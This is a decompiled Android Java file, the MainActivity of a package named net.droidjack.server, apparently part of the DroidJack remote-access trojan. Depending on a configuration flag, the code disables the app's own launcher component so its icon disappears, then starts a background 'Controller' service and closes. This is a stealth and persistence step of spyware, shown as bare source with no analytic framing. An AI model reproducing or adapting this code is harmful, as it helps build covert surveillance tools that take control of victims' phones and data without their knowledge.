package net.droidjack.server;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.widget.Button;

public class MainActivity extends Activity {

    /* renamed from: a  reason: collision with root package name */
    private Button f245a;

    /* renamed from: b  reason: collision with root package name */
    private int f246b = 1337;
    private Intent c;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            if (br.c == 1) {
                Context applicationContext = getApplicationContext();
                applicationContext.getPackageManager().setComponentEnabledSetting(new ComponentName(applicationContext, MainActivity.class), 2, 1);
                this.c = new Intent(this, Controller.class);
                startService(this.c);
                finish();
            }
        } catch (Exception e) {
            ae.a(e);
        }
        try {
            Thread.sleep(2000);
        } catch (InterruptedException e2) {
            e2.printStackTrace();
        }
        try {
            setContentView((int) C0000R.layout.activity_main);
            if (br.c == -1) {
                this.c = new Intent(this, Controller.class);
                this.f245a = (Button) findViewById(C0000R.id.button6);
                this.f245a.setOnClickListener(new bg(this));
                startService(this.c);
            }
        } catch (Exception e3) {
            finish();
        }
    }
}
